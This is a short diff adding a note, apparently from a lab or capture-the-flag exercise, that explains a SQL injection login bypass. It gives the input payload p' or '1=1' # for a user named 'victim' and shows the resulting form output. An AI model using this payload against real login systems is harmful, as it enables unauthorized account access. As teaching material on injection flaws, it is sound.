@@ -1,0 +1,9 @@
+This expoit is simple, just make the where condition of the SQL query true by supplying the "OR" codition and providing 1=1 which makes the 2nd condition true regardless of any password.
+
+
+###I/P###
+Username: victim 
+Password: p' or '1=1' #
+
+###O/P###
+username=victim&password=7f7d28fcbad8c19c66519a57b2bb5f68
